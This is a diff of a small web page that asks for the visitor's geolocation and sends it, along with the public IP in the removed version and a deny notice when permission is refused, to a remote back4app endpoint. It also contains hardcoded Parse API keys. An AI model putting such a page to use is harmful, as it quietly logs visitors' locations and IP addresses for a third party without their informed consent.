@@ -1,29 +1,104 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <title>Send Location</title>
-  </head>
-  <body>
-    <script src="https://www.parsecdn.com/js/parse-1.17.1.min.js"></script>
-    <script>
-      Parse.initialize("ORBsoH5V7XjitvCHfKH0N66xJgiMt0jsKXuxf9m4", "aSTZjBtzGweT75d35fJDv2zb6WJuenH3QiWXdc1a");
-      Parse.serverURL = "https://parseapi.back4app.com/";
+<head>
+  <title>Location Permission Example</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+    }
 
+    #permission-dialog {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Location Permission Example</h1>
 
-      if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          const { latitude, longitude } = position.coords;
-          const ipResponse = await fetch('https://api.ipify.org?format=json');
-          const { ip } = await ipResponse.json();
-          const response = await Parse.Cloud.run('sendLocation', { location: `${latitude},${longitude}`, ip });
-          console.log(response);
-        }, () => {
-          console.log('User denied location permission');
-        });
+  <div id="permission-dialog">
+    <h2>Allow this site to access your location?</h2>
+    <button id="allow-button">Allow</button>
+    <button id="deny-button">Deny</button>
+  </div>
+
+  <script>
+    // Check if the browser supports Geolocation API
+    if ("geolocation" in navigator) {
+      // Display the permission dialog
+      document.getElementById("permission-dialog").style.display = "flex";
+
+      // Listen for button clicks
+      document.getElementById("allow-button").addEventListener("click", () => {
+        requestLocationPermission(true);
+      });
+
+      document.getElementById("deny-button").addEventListener("click", () => {
+        requestLocationPermission(false);
+      });
+    } else {
+      // Geolocation API is not supported
+      alert("Geolocation is not supported by your browser.");
+    }
+
+    // Function to request location permission and handle the response
+    function requestLocationPermission(allow) {
+      if (allow) {
+        // Request location permission
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            // Send the location to the webhook
+            sendLocationToWebhook(position.coords.latitude, position.coords.longitude);
+          },
+          (error) => {
+            console.error("Error getting location:", error);
+          }
+        );
       } else {
-        console.log('Geolocation is not available');
+        // User denied location permission or it's not available
+        // Send the IP address to the webhook
+        sendLocationToWebhook(null, null);
       }
-    </script>
-  </body>
+
+      // Hide the permission dialog
+      document.getElementById("permission-dialog").style.display = "none";
+    }
+
+    // Function to send location data to the webhook
+    function sendLocationToWebhook(latitude, longitude) {
+      // Create a new XMLHttpRequest
+      const xhr = new XMLHttpRequest();
+
+      // Define the request URL
+      const url = "https://localizy.back4app.io/functions/sendLocation";
+
+      // Set the request method to POST
+      xhr.open("POST", url);
+
+      // Set the request headers
+      xhr.setRequestHeader("Content-Type", "application/json");
+
+      // Define the request payload
+      const payload = JSON.stringify({
+        message: {
+          text: latitude && longitude ? "allow" : "deny",
+          location: {
+            latitude: latitude,
+            longitude: longitude
+          },
+          ip: null
+        }
+      });
+
+      // Send the request
+      xhr.send(payload);
+    }
+  </script>
+</body>
 </html>
